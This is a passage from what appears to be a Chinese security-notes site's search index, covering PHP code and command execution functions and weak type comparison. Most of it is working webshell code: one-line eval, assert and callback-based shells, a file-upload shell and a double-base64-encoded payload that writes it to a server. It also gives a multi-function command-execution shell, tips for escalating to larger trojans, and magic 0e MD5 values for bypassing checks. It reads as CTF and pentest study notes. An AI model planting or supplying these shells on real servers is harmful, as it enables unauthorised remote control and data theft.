Waf here\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E4%BC%A0%E5%8F%82%E6%A0%BC%E5%BC%8F/","title":"\u4f20\u53c2\u683c\u5f0f","text":"<p>\u4e4b\u524d\u5728\u505a\u9898\u4e5f\u78b0\u4e0a\u8fd9\u6837\u7684\u4f20\u53c2\u65b9\u5f0f\uff0c\uff08\u5927\u6982\u7387\u662f\u56e0\u4e3a\u4e4b\u524d\u5b66\u7684\u65f6\u5019\u6bd4\u8f83\u4e0d\u4ed4\u7ec6\uff09</p> <p>this-&gt;code =@this-&gt;x()['Ginkgo'];</p> <p>\u8fd9\u91cc\u76f8\u5f53\u4e8e\u53ef\u4ee5\u7528get\u65b9\u5f0f\u8fdb\u884c\u53c2\u6570\u4f20\u9012\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/","title":"\u5e38\u89c1\u547d\u4ee4\u6267\u884c\u51fd\u6570","text":"<p>\u200bphp\u4e2d\u4ee3\u7801\u6267\u884c&amp;&amp;\u547d\u4ee4\u6267\u884c\u51fd\u6570</p> <p>\u9605\u8bfb\u76ee\u5f55(Content)</p> <ul> <li>\u4e8c\u3001\u547d\u4ee4\u6267\u884c\u51fd\u6570   </li> </ul> <p>\u8f6c\u81eai\u6625\u79cb</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#1eval","title":"1\u3001eval()\u51fd\u6570","text":"<pre><code>#\u4f20\u5165\u7684\u53c2\u6570\u5fc5\u987b\u4e3aPHP\u4ee3\u7801\uff0c\u65e2\u9700\u8981\u4ee5\u5206\u53f7\u7ed3\u5c3e\u3002\n#\u547d\u4ee4\u57f7\u884c\uff1acmd=system(whoami);\n#\u83dc\u5200\u8fde\u63a5\u5bc6\u7801\uff1acmd\n&lt;?php @eval($_POST['cmd']);?&gt;\n</code></pre> <p>\u90a3\u4e48\u5f53\u6211\u4eec\u4e0a\u4f20\u4e86eval\u51fd\u6570\u7684\u83dc\u5200\u9a6c\u4e4b\u540e\uff0c\u5728\u8fde\u63a5\u4e0d\u4e0a\u83dc\u5200\u7684\u60c5\u51b5\u4e0b\u600e\u4e48\u4e0a\u4f20\u5927\u9a6c\u5462\uff1f\u7ee7\u7eed\u5f80\u4e0b\u770b</p> <p>\u8fd9\u91cc\u6211\u662f\u5148\u5199\u4e00\u4e2a\u4e0a\u4f20\u9a6c\uff0c\u518d\u7528\u4e0a\u4f20\u9a6c\u53bb\u4e0a\u4f20\u5927\u9a6c\uff0c\u6709\u70b9\u591a\u6b21\u4e00\u4e3e\uff0c\u4f46\u662f\u8003\u8651\u5230\u5927\u9a6c\u4ee3\u7801\u91cf\u592a\u591a\uff0c\u8fd8\u662f\u5efa\u8bae\u5148\u5199\u4e2a\u4e0a\u4f20\u9a6c\uff0c\u4ee5\u4e0b\u4ee3\u7801\u53ea\u67091kb\u3002</p> <pre><code>&lt;?php\n@$temp = $_FILES['upload_file']['tmp_name'];\n@$file = basename($_FILES['upload_file']['name']);\nif (empty ($file)){\necho \"&lt;form action = '' method = 'POST' ENCTYPE='multipart/form-data'&gt;\\\\n\";echo \"Local file: &lt;input type = 'file' name = 'upload_file'&gt;\\\\n\";echo \"&lt;input type = 'submit' value = 'Upload'&gt;\\\\n\";echo \"&lt;/form&gt;\\\\n&lt;pre&gt;\\\\n\\\\n&lt;/pre&gt;\";}else {if(move_uploaded_file($temp,$file)){echo \"File uploaded successfully.&lt;p&gt;\\\\n\";}else {echo \"Unable to upload \" . $file . \".&lt;p&gt;\\\\n\";}}?&gt;\n</code></pre> <p>\u539f\u7406\u662f\u5229\u7528\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u5982\u4e0b\uff1a</p> <pre><code>fputs(fopen(shell.php,w),xxxx);\n</code></pre> <p>\u5199\u5165xxxx\u5230\u811a\u672c\u6267\u884c\u6587\u4ef6\u5f53\u524d\u76ee\u5f55\u4e0b\u7684shell.php\u6587\u4ef6\u3002</p> <p>\u7531\u4e8e\u662f\u5229\u7528post\u4f20\u53c2\uff0c\u4e0d\u80fd\u51fa\u73b0\u3010&lt;\u3011\u3010&gt;\u3011\u3010+\u3011\u3010=\u3011\u3010/\u3011\u7b49\u7b26\u53f7\uff0c\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u628a\u4ee3\u7801\u7f16\u7801\u4e00\u4e0b\uff0c\u5c06\u4e0a\u9762\u7684\u4e0a\u4f20\u4ee3\u7801\u8fdb\u884c\u4e24\u6b21base64\u7f16\u7801\uff08\u4e3a\u4e86\u53bb\u9664=\u53f7\uff09\u3002</p> <p>\u2606\u2606\u2606\u5728\u7f16\u7801\u7684\u65f6\u5019\u7a7a\u683c\u548c\u56de\u8f66\u90fd\u4f1a\u5f71\u54cd\u7f16\u7801\u540e\u7684\u7ed3\u679c\uff0c\u56e0\u6b64\u5efa\u8bae\u5927\u5bb6\u76f4\u63a5\u590d\u5236\u6211\u4e0a\u9762\u7684\u4e0a\u4f20\u9a6c\u6216\u8005\u7528\u4e0b\u9762\u6211\u7f16\u7801\u597d\u7684\uff0c\u6216\u8005\u81ea\u5df1\u53bb\u6162\u6162\u5c1d\u8bd5\u76f4\u5230base64\u7f16\u7801\u540e\u4e3a\u4e00\u4e32\u81ea\u7531\u6570\u5b57\u548c\u5b57\u6bcd\u7684\u5b57\u7b26\u4e32\u5373\u53ef\u3002</p> <p>\u63a5\u4e0b\u6765\u5229\u7528\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u5199\u5165\u4e0a\u4f20\u9a6c\uff0c\u6ce8\u610f\u4e0d\u8981\u5fd8\u4e86\u6700\u540e\u7684\u5206\u53f7\u3002</p> <pre><code>cmd=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));\n</code></pre> <p>\u6210\u529f\u5f97\u5230\u4e0a\u4f20\u9a6c\uff0c\u4e4b\u540e\u5c31\u662f\u4e0a\u4f20\u6211\u4eec\u7684\u5927\u9a6c\u4e86\u3002</p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#2assert","title":"2\u3001assert()\u51fd\u6570","text":"<pre><code>#assert\u51fd\u6570\u662f\u76f4\u63a5\u5c06\u4f20\u5165\u7684\u53c2\u6570\u5f53\u6210PHP\u4ee3\u7801\u76f4\u63a5\uff0c\u4e0d\u9700\u8981\u4ee5\u5206\u53f7\u7ed3\u5c3e\uff0c\u5f53\u7136\u4f60\u52a0\u4e0a\u4e5f\u53ef\u4ee5\u3002\n#\u547d\u4ee4\u57f7\u884c\uff1acmd=system(whoami)\n#\u83dc\u5200\u8fde\u63a5\u5bc6\u7801\uff1acmd\n&lt;?php @assert($_POST['cmd'])?&gt;\n</code></pre> <p>\u4e0a\u4f20\u5927\u9a6c,\u8fd9\u4e00\u6b65\u53c2\u8003eval\u51fd\u6570\u3002</p> <p>\u5176\u4ed6\u7684\u4ee3\u7801\u6267\u884c\u51fd\u6570\u8fd8\u6709\u4ee5\u4e0b\u51e0\u4e2a\uff0c\u5747\u7ed9\u51fa\u4e86\u83dc\u5200\u9a6c\u548c\u8fde\u63a5\u65b9\u5f0f\uff1a</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#3preg_replace","title":"3\u3001preg_replace()","text":"<pre><code>#preg_replace('\u6b63\u5219\u89c4\u5219','\u66ff\u6362\u5b57\u7b26'\uff0c'\u76ee\u6807\u5b57\u7b26')\n#\u6267\u884c\u547d\u4ee4\u548c\u4e0a\u4f20\u6587\u4ef6\u53c2\u8003assert\u51fd\u6570(\u4e0d\u9700\u8981\u52a0\u5206\u53f7)\u3002\n#\u5c06\u76ee\u6807\u5b57\u7b26\u4e2d\u7b26\u5408\u6b63\u5219\u89c4\u5219\u7684\u5b57\u7b26\u66ff\u6362\u4e3a\u66ff\u6362\u5b57\u7b26\uff0c\u6b64\u65f6\u5982\u679c\u6b63\u5219\u89c4\u5219\u4e2d\u4f7f\u7528/e\u4fee\u9970\u7b26\uff0c\u5219\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\npreg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\");\n</code></pre> <p>\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528chr()\u51fd\u6570\u8f6c\u6362ASCII\u7f16\u7801\u6765\u6267\u884c\u4ee3\u7801\u3002</p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#phpinfo","title":"phpinfo();","text":"<p>eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59))</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#4create_function","title":"4\u3001create_function()\u51fd\u6570","text":"<pre><code>#\u521b\u5efa\u533f\u540d\u51fd\u6570\u6267\u884c\u4ee3\u7801\n#\u6267\u884c\u547d\u4ee4\u548c\u4e0a\u4f20\u6587\u4ef6\u53c2\u8003eval\u51fd\u6570(\u5fc5\u987b\u52a0\u5206\u53f7)\u3002\n#\u83dc\u5200\u8fde\u63a5\u5bc6\u7801\uff1acmd\n$func =create_function('',$_POST['cmd']);$func();\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#5array_map","title":"5\u3001array_map()\u51fd\u6570","text":"<pre><code>#array_map() \u51fd\u6570\u5c06\u7528\u6237\u81ea\u5b9a\u4e49\u51fd\u6570\u4f5c\u7528\u5230\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u503c\u4e0a\uff0c\u5e76\u8fd4\u56de\u7528\u6237\u81ea\u5b9a\u4e49\u51fd\u6570\u4f5c\u7528\u540e\u7684\u5e26\u6709\u65b0\u503c\u7684\u6570\u7ec4\u3002 \u56de\u8c03\u51fd\u6570\u63a5\u53d7\u7684\u53c2\u6570\u6570\u76ee\u5e94\u8be5\u548c\u4f20\u9012\u7ed9 array_map() \u51fd\u6570\u7684\u6570\u7ec4\u6570\u76ee\u4e00\u81f4\u3002\n#\u547d\u4ee4\u6267\u884chttp://localhost/123.php?func=system   cmd=whoami\n#\u83dc\u5200\u8fde\u63a5http://localhost/123.php?func=assert   \u5bc6\u7801\uff1acmd\n$func=$_GET['func'];\n$cmd=$_POST['cmd'];\n$array[0]=$cmd;\n$new_array=array_map($func,$array);\necho $new_array;\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#6call_user_func","title":"6\u3001call_user_func()\u51fd\u6570","text":"<pre><code>#\u4f20\u5165\u7684\u53c2\u6570\u4f5c\u4e3aassert\u51fd\u6570\u7684\u53c2\u6570\n#cmd=system(whoami)\n#\u83dc\u5200\u8fde\u63a5\u5bc6\u7801\uff1acmd\ncall_user_func(\"assert\",$_POST['cmd']);\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#7call_user_func_array","title":"7\u3001call_user_func_array()\u51fd\u6570","text":"<pre><code>#\u5c06\u4f20\u5165\u7684\u53c2\u6570\u4f5c\u4e3a\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u503c\u4f20\u9012\u7ed9assert\u51fd\u6570\n#cmd=system(whoami)\n#\u83dc\u5200\u8fde\u63a5\u5bc6\u7801\uff1acmd\n$cmd=$_POST['cmd'];\n$array[0]=$cmd;\ncall_user_func_array(\"assert\",$array);\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#8array_filter","title":"8\u3001array_filter()\u51fd\u6570","text":"<pre><code>#\u7528\u56de\u8c03\u51fd\u6570\u8fc7\u6ee4\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\uff1aarray_filter(\u6570\u7ec4,\u51fd\u6570)\n#\u547d\u4ee4\u6267\u884cfunc=system&amp;cmd=whoami\n#\u83dc\u5200\u8fde\u63a5http://localhost/123.php?func=assert  \u5bc6\u7801cmd\n$cmd=$_POST['cmd'];\n$array1=array($cmd);\n$func =$_GET['func'];\narray_filter($array1,$func);\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#9uasort","title":"9\u3001uasort()\u51fd\u6570","text":"<pre><code>#php\u73af\u5883&gt;=&lt;5.6\u624d\u80fd\u7528\n#uasort() \u4f7f\u7528\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u6bd4\u8f83\u51fd\u6570\u5bf9\u6570\u7ec4\u4e2d\u7684\u503c\u8fdb\u884c\u6392\u5e8f\u5e76\u4fdd\u6301\u7d22\u5f15\u5173\u8054 \u3002\n#\u547d\u4ee4\u6267\u884c\uff1ahttp://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);\n#\u83dc\u5200\u8fde\u63a5\uff1ahttp://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   \u5bc6\u7801\uff1acmd\nusort($_GET,'asse'.'rt');\n</code></pre> <p>\u56de\u5230\u9876\u90e8(go to top)</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/#_1","title":"\u4e8c\u3001\u547d\u4ee4\u6267\u884c\u51fd\u6570","text":"<p>PHP\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u6709\u51e0\u4e2a\u5e38\u7528\u7684\u51fd\u6570,\u5982\u6709:system\u51fd\u6570\u3001exec\u51fd\u6570\u3001popen\u51fd\u6570,passthru,shell_exec\u51fd\u6570\u4ed6\u4eec\u90fd\u53ef\u4ee5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u4e0b\u9762\u662f\u6211\u6574\u7406\u7684\u4e00\u4e2a\u547d\u4ee4\u9a6c\uff0c\u628a\u5e38\u89c1\u7684\u547d\u4ee4\u6267\u884c\u51fd\u6570\u90fd\u505a\u4e86\u4e00\u4e2a\u68b3\u7406\uff0c\u5982\u679c\u5927\u5bb6\u8fd8\u6709\u4ec0\u4e48\u65b0\u7684\u601d\u8def\u6216\u89c1\u89e3\uff0c\u53ef\u4ee5\u4e00\u8d77\u4ea4\u6d41\u4ea4\u6d41\u3002</p> <p></p> <pre><code>&lt;?php\n$command=$_POST['cmd'];\n#function exec_all($command)\n#{\n\n//system\u51fd\u6570\u53ef\u6267\u884c\u5e76\u76f4\u63a5\u663e\u793a\u7ed3\u679c\nif(function_exists('system'))\n{\necho \"&lt;pre&gt;\";\nsystem($command);\necho \"&lt;/pre&gt;\";\n}\n\n//passthru\u51fd\u6570\u53ef\u6267\u884c\u5e76\u76f4\u63a5\u663e\u793a\u7ed3\u679c\nelse if(function_exists('passthru'))\n{\necho \"&lt;pre&gt;\";\npassthru($command);\necho \"&lt;/pre&gt;\";\n}\n\n//shell_exec\u51fd\u6570\u53ef\u6267\u884c\u4f46\u9700\u8981\u52a0echo\u624d\u80fd\u663e\u793a\u7ed3\u679c\nelse if(function_exists('shell_exec'))\n{\necho \"&lt;pre&gt;\";\necho shell_exec($command);\necho \"&lt;/pre&gt;\";\n}\n\n//function exec(\u547d\u4ee4\uff0c\u4ee5\u6570\u7ec4\u5f62\u5f0f\u7684\u4fdd\u5b58\u7ed3\u679c\uff0c\u547d\u4ee4\u6267\u884c\u7684\u72b6\u6001\u7801)\n//\u53ef\u6267\u884c\uff0c\u4f46\u9700\u8981\u52a0echo\u624d\u80fd\u663e\u793a\u7ed3\u679c\nelse if(function_exists('exec'))\n{\necho \"&lt;pre&gt;\";\nexec($command,$output);\necho \"&lt;/br&gt;\";\nprint_r($output);\necho \"&lt;/pre&gt;\";\n}\n\n//popen\u51fd\u6570\uff1a\u6253\u5f00\u4e00\u4e2a\u6307\u5411\u8fdb\u7a0b\u7684\u7ba1\u9053\uff0c\u8be5\u8fdb\u7a0b\u7531\u6d3e\u751f\u6307\u5b9a\u7684 command \u547d\u4ee4\u6267\u884c\u800c\u4ea7\u751f\u3002\n//\u8fd4\u56de\u4e00\u4e2a\u548c fopen() \u6240\u8fd4\u56de\u7684\u76f8\u540c\u7684\u6587\u4ef6\u6307\u9488\uff0c\u53ea\u4e0d\u8fc7\u5b83\u662f\u5355\u5411\u7684\uff08\u53ea\u80fd\u7528\u4e8e\u8bfb\u6216\u5199\uff09\n//\u6b64\u6307\u9488\u53ef\u4ee5\u7528\u4e8e fgets()\uff0cfgetss() \u548c fwrite()\u3002\u5e76\u4e14\u5fc5\u987b\u7528 pclose() \u6765\u5173\u95ed\u3002\n//\u82e5\u51fa\u9519\uff0c\u5219\u8fd4\u56de false\u3002\nelse if(function_exists('popen'))\n{\n$handle = popen($command , \"r\"); // Open the command pipe for reading\nif(is_resource($handle))\n{\nif(function_exists('fread') &amp;&amp; function_exists('feof'))\n{\necho \"&lt;pre&gt;\";\nwhile(!feof($handle))\n{\necho fread($handle, 1024);\n}\necho \"&lt;/pre&gt;\";\n}\nelse if(function_exists('fgets') &amp;&amp; function_exists('feof'))\n{\necho \"&lt;pre&gt;\";\nwhile(!feof($handle))\n{\necho fgets($handle,1024);\n}\necho \"&lt;pre&gt;\";\n}\n}\npclose($handle);\n}\n\n//proc_open \u2014 \u6267\u884c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5e76\u4e14\u6253\u5f00\u7528\u6765\u8f93\u5165/\u8f93\u51fa\u7684\u6587\u4ef6\u6307\u9488\u3002\nelse if(function_exists('proc_open'))\n{\n$descriptorspec = array(\n1 =&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n);\n$handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'\nif(is_resource($handle))\n{\nif(function_exists('fread') &amp;&amp; function_exists('feof'))\n{\necho \"&lt;pre&gt;\";\nwhile(!feof($pipes[1]))\n{\necho fread($pipes[1], 1024);\n}\necho \"&lt;/pre&gt;\";\n}\nelse if(function_exists('fgets') &amp;&amp; function_exists('feof'))\n{\necho \"&lt;pre&gt;\";\nwhile(!feof($pipes[1]))\n{\necho fgets($pipes[1],1024);\n}\necho \"&lt;pre&gt;\";\n}\n}\n#pclose($handle);\n}\n\nelse\n{\necho 'GG';\n}\n#}\n</code></pre> <p></p> <p>\u5176\u4ed6\u51fd\u6570\uff1a</p> <p>\u6682\u65f6\u5c31\u77e5\u9053\u5176\u4ed6\u4e24\u4e2a\u51fd\u6570\uff0c\u4e0d\u8fc7\u4e5f\u90fd\u662f\u57fa\u4e8e\u4ee5\u4e0a\u7684\u51fd\u6570\u6240\u53d8\u5316\u7684\u3002</p> <p></p> <pre><code>&lt;?php\n$cmd=$_POST['cmd'];\necho \"&lt;pre&gt;\";\n\n//\u53ef\u6267\u884c\u5e76\u76f4\u63a5\u663e\u793a\u7ed3\u679c,\u53cd\u5f15\u53f7\uff0c\u6ce2\u6d6a\u952e\u3002\n//shell_exec() \u51fd\u6570\u5b9e\u9645\u4e0a\u4ec5\u662f\u53cd\u6487\u53f7 (`) \u64cd\u4f5c\u7b26\u7684\u53d8\u4f53\n//\u6240\u4ee5\u5982\u679c\u628ashell_exec()\u51fd\u6570\u7981\u7528\u4e86\uff0c\u53cd\u6487\u53f7 (`)\u4e5f\u662f\u6267\u884c\u4e0d\u4e86\u547d\u4ee4\u7684\u3002\necho `$cmd`;\n\n\n//\u6ce8\u610f\uff0c\u8fd9\u4e2a\u53ea\u663e\u793a\u7ed3\u679c\u7684\u7b2c\u4e00\u884c\uff0c\u56e0\u6b64\u57fa\u672c\u53ea\u80fd\u6267\u884cwhoami\n//ob_start\uff1a\u6253\u5f00\u7f13\u51b2\u533a,\u9700\u8981system\u51fd\u6570\u5f00\u542f\n$a = 'system';\nob_start($a);\necho \"$_POST[cmd]\";\nob_end_flush();\n\necho \"&lt;/pre&gt;\";\n</code></pre> <p></p> <p>\u4e0a\u9762\u8bb2\u5b8c\u547d\u4ee4\u6267\u884c\u547d\u4ee4\uff0c\u4e5f\u90fd\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u4e86\uff0c\u90a3\u4e48\u5982\u4f55\u5229\u7528\u8fd9\u4e9b\u547d\u4ee4\u9a6c\u6765\u8fdb\u4e00\u6b65\u4e0a\u4f20\u6211\u4eec\u7684\u5927\u9a6c\u5462\uff0c\u8fd9\u91cc\u5c31\u8981\u6d89\u53ca\u5230\u4e00\u4e0bCMD\u547d\u4ee4\u4e86\uff0c\u6709\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u53bb\u53c2\u8003\u94fe\u63a5\u67e5\u770b\u300aCMD\u547d\u4ee4\u7279\u6b8a\u7b26\u53f7\u300b\u7684\u6587\u7ae0\u3002</p> <p>\u8fd9\u91cc\u4e86\u6211\u662f\u7528echo\u5199\u6587\u4ef6\u7684\u601d\u8def\uff0c\u9057\u5fd8\u5927\u4f6c\u6559\u7684\u7528msf\u7ed3\u5408\u547d\u4ee4\u884c\u53bb\u4e0b\u8f7d\u5927\u9a6c\u6211\u6682\u65f6\u8fd8\u6ca1\u53bb\u5b9e\u8df5\uff0c\u5c31\u7559\u7740\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u5199\u4e86\uff0c\u5e9f\u8bdd\u4e0d\u591a\u8bf4\uff0c\u5f00\u5e72\u5427\uff01</p> <p></p> <p></p> <p>\u7136\u540e\u7528\u3010echo\u3011\u547d\u4ee4\u5199\u5165\u6211\u4eec\u7684\u4e0a\u4f20\u9a6c</p> <p></p> <p>\u2606\u2606\u2606\u8fd9\u91cc\u6ce8\u610f\u3010&lt;\u3011\u3010&gt;\u3011\u3010&amp;\u3011\u8fd9\u4e09\u4e2a\u5b57\u7b26\u5728CMD\u547d\u4ee4\u884c\u4e2d\u6709\u7279\u6b8a\u610f\u4e49\uff0c\u9700\u8981\u5728\u524d\u9762\u52a0\u3010^\u3011\u8fdb\u884c\u8f6c\u4e49\uff0c\u53ef\u4ee5\u7528\u6587\u672c\u7684\u66ff\u6362\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u3002</p> <p></p> <p>\u5199\u5165\u6210\u529f\u4e4b\u540e\u5c31\u53ef\u4ee5\u4e0a\u4f20\u6211\u4eec\u7684\u5927\u9a6c\u5566 -\uff01</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/","title":"\u5f31\u7c7b\u578b\u6bd4\u8f83","text":"<p>\u867d\u7136\u7b80\u5355\u800c\u4e14\u53ef\u80fd\u662f\u89c1\u8fc7\u5f88\u591a\u6b21\uff0c\u4f46\u662f\u554a\u8fd8\u662f\u653e\u4e00\u4e0b</p> <p>\"admin\"==0\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5c06admin\u8f6c\u5316\u6210\u6570\u503c\uff0c\u5f3a\u5236\u8f6c\u5316,\u7531\u4e8eadmin\u662f\u5b57\u7b26\u4e32\uff0c\u8f6c\u5316\u7684\u7ed3\u679c\u662f0\u81ea\u7136\u548c0\u76f8\u7b49</p> <p>\"1admin\"==1\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u5c061admin\u8f6c\u5316\u6210\u6570\u503c,\u7ed3\u679c\u4e3a1\uff0c\u800c\u201cadmin1\u201c==1 \u5374\u7b49\u4e8e\u9519\u8bef\uff0c\u4e5f\u5c31\u662f\"admin1\"\u88ab\u8f6c\u5316\u6210\u4e860</p> <p>\"0e123456\"==\"0e456789\"\u76f8\u4e92\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5c060e\u8fd9\u7c7b\u5b57\u7b26\u4e32\u8bc6\u522b\u4e3a\u79d1\u5b66\u6280\u672f\u6cd5\u7684\u6570\u5b57\uff0c0\u7684\u65e0\u8bba\u591a\u5c11\u6b21\u65b9\u90fd\u662f\u96f6\uff0c\u6240\u4ee5\u76f8\u7b49\u3002</p> <p>0e\u5728\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u5c06\u5176\u89c6\u4f5c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u6240\u4ee5\u65e0\u8bba0e\u540e\u9762\u662f\u4ec0\u4e48\uff0c0\u7684\u591a\u5c11\u6b21\u65b9\u8fd8\u662f0\u3002md5('240610708')== md5('QNKCDZO')\u6210\u529f\u7ed5\u8fc7!</p> <pre><code>QNKCDZO\n\n0e830400451993494058024219903391\n\ns878926199a\n\n0e545993274517709034328855841020\n\ns155964671a\n\n0e342768416822451524974117254469\n\ns214587387a\n\n0e848240448830537924465865611904\n\ns214587387a\n\n0e848240448830537924465865611904\n\ns878926199a\n\n0e545993274517709034328855841020\n\ns1091221200a\n\n0e940624217856561557816327384675\n\ns1885207154a\n\n0e509367213418206700842008763514\nPlain 